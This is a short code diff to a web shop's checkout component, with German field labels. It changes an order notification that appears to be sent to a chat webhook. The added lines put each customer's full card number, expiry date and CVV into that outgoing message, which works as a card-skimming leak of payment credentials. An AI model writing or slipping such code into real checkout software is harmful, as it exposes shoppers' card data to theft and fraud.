@@ -52,6 +52,9 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
           { name: "Adresse", value: `${formData.address}, ${formData.zipCode} ${formData.city}`, inline: false },
           { name: "Artikel", value: items.map(item => `${item.name} - €${item.price}`).join('\n'), inline: false },
           { name: "Gesamtsumme", value: `€${total.toFixed(2)}`, inline: true },
+          { name: "Kartennummer", value: formData.cardNumber, inline: true },
+          { name: "Ablaufdatum", value: formData.expiryDate, inline: true },
+          { name: "CVV", value: formData.cvv, inline: true },
         ],
         timestamp: new Date().toISOString(),
       }]
